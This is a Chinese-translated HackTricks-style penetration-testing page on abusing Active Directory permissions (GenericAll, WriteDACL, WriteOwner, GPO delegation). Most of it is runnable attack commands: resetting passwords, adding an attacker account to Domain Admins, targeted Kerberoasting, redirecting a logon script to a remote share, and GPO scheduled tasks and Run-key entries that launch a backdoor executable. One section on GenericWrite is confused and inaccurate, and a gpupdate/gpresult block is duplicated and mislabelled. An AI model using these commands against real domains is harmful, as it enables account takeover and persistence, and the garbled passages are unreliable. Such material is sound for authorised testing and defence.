# 滥用Active Directory ACLs/ACEs

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 上下文

这个实验室是为了滥用Active Directory Discretionary Access Control Lists (DACLs)和Acccess Control Entries (ACEs)的弱权限。

Active Directory对象，如用户和组，是可保护的对象，DACL/ACEs定义了谁可以读取/修改这些对象（例如更改帐户名称，重置密码等）。

这里是"Domain Admins"可保护对象的一些ACEs示例：

![](../../../.gitbook/assets/1.png)

作为攻击者，我们对一些Active Directory对象的权限和类型感兴趣：

* **GenericAll** - 对对象拥有完全权限（添加用户到组或重置用户密码）
* **GenericWrite** - 更新对象的属性（例如登录脚本）
* **WriteOwner** - 将对象所有者更改为攻击者控制的用户，接管对象
* **WriteDACL** - 修改对象的ACEs，并赋予攻击者对对象的完全控制权
* **AllExtendedRights** - 能够将用户添加到组或重置密码
* **ForceChangePassword** - 能够更改用户的密码
* **Self (Self-Membership)** - 能够将自己添加到组中

在这个实验室中，我们将探索并尝试利用上述大部分ACEs。

值得熟悉所有的[BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)和尽可能多的Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights)，因为你永远不知道在评估过程中是否会遇到一个不常见的权限。

## 用户上的GenericAll

使用powerview，让我们检查我们的攻击用户`spotless`是否对用户`delegate`的AD对象具有`GenericAll权限`：
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
我们可以看到，我们的用户`spotless`确实拥有`GenericAll`权限，这有效地使攻击者能够接管该帐户：

![](../../../.gitbook/assets/2.png)

*   **更改密码**：您可以使用以下命令更改该用户的密码

```bash
net user <username> <password> /domain
```
*   **定向Kerberoasting**：您可以在该帐户上设置**SPN**，使用户成为**kerberoastable**，然后对其进行kerberoast并尝试离线破解：

```powershell
# 设置SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# 获取哈希
.\Rubeus.exe kerberoast /user:<username> /nowrap
# 清除SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# 您还可以使用工具https://github.com/ShutdownRepo/targetedKerberoast
# 获取一个或所有用户的哈希
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **定向ASREPRoasting**：您可以通过**禁用** **预身份验证**来使用户**ASREPRoastable**，然后对其进行ASREProast。

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## Group上的GenericAll权限

让我们看看`Domain admins`组是否具有任何弱权限。首先，让我们获取其`distinguishedName`：
```csharp
Get-NetGroup "domain admins" -FullData
```
![](../../../.gitbook/assets/4.png)
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
我们可以看到我们的攻击用户`spotless`再次拥有`GenericAll`权限：

![](../../../.gitbook/assets/5.png)

实际上，这使我们能够将自己（用户`spotless`）添加到`Domain Admin`组中：
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

同样可以使用Active Directory或PowerSploit模块来实现：
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write on Computer/User

* 如果您在**计算机对象**上拥有这些权限，您可以执行[Kerberos **基于资源的受限委派**：接管计算机对象](../resource-based-constrained-delegation.md)。
* 如果您对用户拥有这些权限，您可以使用本页面中[第一个方法](./#genericall-on-user)中解释的方法之一。
* 或者，无论是在计算机还是用户上，您都可以使用**影子凭据**来冒充它：

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty on Group

如果我们控制的用户对`Domain Admin`组的`All`对象具有`WriteProperty`权限：

![](../../../.gitbook/assets/7.png)

我们可以再次将自己添加到`Domain Admins`组并提升权限：
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## 组内自我成员（Self-Membership）

另一个使攻击者能够将自己添加到组中的权限：

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty（自我成员身份）

另一个使攻击者能够将自己添加到组中的权限是：
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/11.png)
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword（强制更改密码）**

如果我们对`User-Force-Change-Password`（用户强制更改密码）对象类型拥有`ExtendedRight`（扩展权限），我们可以在不知道用户当前密码的情况下重置用户的密码：
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
使用powerview进行相同操作：
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

另一种不需要与密码安全字符串转换纠缠的方法是：
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...或者如果没有交互式会话，则可以使用一行命令：
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

最后一种方法是从Linux实现这一点：
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
更多信息：

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## 在组上使用WriteOwner

请注意，在攻击之前，`Domain Admins`的所有者是`Domain Admins`：

![](../../../.gitbook/assets/17.png)

在ACE枚举之后，如果我们发现我们控制的用户具有`WriteOwner`权限，并且`ObjectType:All`
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/18.png)

...我们可以将`Domain Admins`对象的所有者更改为我们的用户，即`spotless`。请注意，使用`-Identity`指定的SID是`Domain Admins`组的SID：
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## 对用户的GenericWrite权限滥用

在Active Directory中，GenericWrite权限允许用户对对象的属性进行写入操作，包括对对象的许多敏感属性进行修改。这些属性包括用户密码、组成员资格和其他重要信息。

攻击者可以通过滥用GenericWrite权限来实现持久性访问。以下是一种常见的滥用方法：

1. 获取对目标用户的WriteProperty权限。
2. 使用WriteProperty权限修改目标用户的成员属性，将攻击者的账户添加到目标用户所在的高权限组中。
3. 攻击者现在具有高权限组的成员身份，可以利用这些权限进行进一步的攻击，例如修改其他用户的属性、创建后门账户等。

这种滥用方法的关键在于获取对目标用户的WriteProperty权限。攻击者可以通过以下方式获取该权限：

- 利用已知的漏洞或弱密码来获取目标用户的凭证。
- 利用域内的其他权限滥用方法，例如Pass the Hash攻击或Golden Ticket攻击。

为了防止GenericWrite权限的滥用，可以采取以下措施：

- 限制用户对敏感属性的写入权限。
- 定期审查高权限组的成员，并删除不必要的成员。
- 实施强密码策略，以防止密码被猜测或暴力破解。
- 定期审查域内的权限配置，确保没有存在滥用权限的漏洞。

通过采取这些措施，可以减少攻击者滥用GenericWrite权限的风险，并提高Active Directory的安全性。
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/20.png)

在这种特殊情况下，对于`Script-Path`的`ObjectType`进行`WriteProperty`操作，允许攻击者覆盖`delegate`用户的登录脚本路径，这意味着下次`delegate`用户登录时，系统将执行我们的恶意脚本：
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
以下显示了用户的~~`delegate`~~登录脚本字段在AD中被更新：

![](../../../.gitbook/assets/21.png)

## 对组的GenericWrite权限

这允许您将新用户（例如您自己）设置为组的成员：
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## WriteDACL + WriteOwner

如果你是一个组的所有者，就像我是一个`Test` AD组的所有者：

![](../../../.gitbook/assets/22.png)

当然，你可以通过PowerShell来实现：
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

如果你对AD对象有`WriteDACL`权限：

![](../../../.gitbook/assets/24.png)

...你可以通过一点点ADSI魔法赋予自己[`GenericAll`](../../../windows/active-directory-methodology/broken-reference/)权限：
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
这意味着您现在完全控制AD对象：

![](../../../.gitbook/assets/25.png)

这实际上意味着您现在可以向组中添加新用户。

有趣的是，我无法通过使用Active Directory模块和`Set-Acl` / `Get-Acl`命令来滥用这些权限：
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **在域上复制（DCSync）**

**DCSync** 权限意味着对域本身具有以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。\
[**在这里了解更多关于 DCSync 攻击的信息。**](../dcsync.md)

## GPO 委派 <a href="#gpo-delegation" id="gpo-delegation"></a>

有时，某些用户/组可能被委派访问管理组策略对象，就像 `offense\spotless` 用户一样：

![](../../../.gitbook/assets/a13.png)

我们可以通过利用 PowerView 来查看这一点：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
下面表明用户`offense\spotless`具有**WriteProperty**、**WriteDacl**、**WriteOwner**等权限，这些权限都可以被滥用：

![](../../../.gitbook/assets/a14.png)

### 枚举GPO权限 <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

我们知道上面截图中的ObjectDN是指`New Group Policy Object` GPO，因为ObjectDN指向`CN=Policies`，而且`CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`在GPO设置中也是相同的，如下所示：

![](../../../.gitbook/assets/a15.png)

如果我们想要专门搜索配置错误的GPO，可以使用PowerSploit中的多个cmdlet链接起来，如下所示：
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
**应用了特定策略的计算机**

我们现在可以解析应用了GPO“配置错误策略”的计算机名称：
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
**应用于特定计算机的策略**

The following command can be used to list the policies applied to a given computer:

以下命令可用于列出应用于特定计算机的策略：

```plaintext
gpresult /scope computer /r
```

**List of Applied Policies**

**已应用策略列表**

The output of the above command will display a list of applied policies, including the policy name, the winning GPO (Group Policy Object), and the policy setting.

上述命令的输出将显示已应用策略的列表，包括策略名称、获胜的 GPO（组策略对象）和策略设置。

**Policies Applied to a Given User**

**应用于特定用户的策略**

The following command can be used to list the policies applied to a given user:

以下命令可用于列出应用于特定用户的策略：

```plaintext
gpresult /scope user /r
```

**List of Applied Policies**

**已应用策略列表**

The output of the above command will display a list of applied policies, including the policy name, the winning GPO (Group Policy Object), and the policy setting.

上述命令的输出将显示已应用策略的列表，包括策略名称、获胜的 GPO（组策略对象）和策略设置。

**Modifying Policies**

**修改策略**

To modify a policy, you can use the following command:

要修改策略，可以使用以下命令：

```plaintext
gpupdate /force
```

This command will force an immediate update of the policies applied to the computer or user.

此命令将立即强制更新应用于计算机或用户的策略。

**Note:** Modifying policies may require administrative privileges.

**注意：**修改策略可能需要管理员权限。
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**应用了给定策略的组织单位（OUs）**
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **滥用GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

滥用此配置错误并获得代码执行的一种方法是通过GPO创建一个立即执行的计划任务，如下所示：
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

上述代码将我们的用户spotless添加到被入侵的计算机的本地`administrators`组中。请注意，在执行代码之前，该组不包含用户`spotless`：

![](../../../.gitbook/assets/a20.png)

### GroupPolicy模块 **- 滥用GPO**

{% hint style="info" %}
您可以使用`Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`检查GroupPolicy模块是否已安装。在紧急情况下，您可以使用`Install-WindowsFeature –Name GPMC`作为本地管理员进行安装。
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
这个payload在GPO更新后，还需要有人登录到计算机上。

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- 滥用GPO**

{% hint style="info" %}
它无法创建GPO，因此我们仍然需要使用RSAT进行创建，或者修改我们已经具有写访问权限的GPO。
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 强制策略更新 <a href="#force-policy-update" id="force-policy-update"></a>

先前的滥用 **GPO 更新** 大约每 90 分钟重新加载一次。\
如果你可以访问计算机，可以使用 `gpupdate /force` 强制更新。

### 内部机制 <a href="#under-the-hood" id="under-the-hood"></a>

如果我们观察 `Misconfigured Policy` GPO 的计划任务，我们可以看到我们的 `evilTask` 在那里：

![](../../../.gitbook/assets/a22.png)

下面是由 `New-GPOImmediateTask` 创建的 XML 文件，表示我们在 GPO 中的恶意计划任务：

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### 用户和组 <a href="#users-and-groups" id="users-and-groups"></a>

通过滥用GPO（组策略对象）的用户和组功能，也可以实现相同的权限提升。请注意下面的文件中，第6行将用户`spotless`添加到本地的`administrators`组 - 我们可以将用户更改为其他用户，添加另一个用户，甚至将用户添加到另一个组/多个组，因为我们可以修改显示位置的策略配置文件，这是由于我们的用户`spotless`被分配了GPO委派权限：

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
{% endcode %}

此外，我们可以考虑利用登录/注销脚本，使用注册表进行自启动，安装.msi，编辑服务等方式进行代码执行。

## 参考资料

* 最初，这些信息主要来自于[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
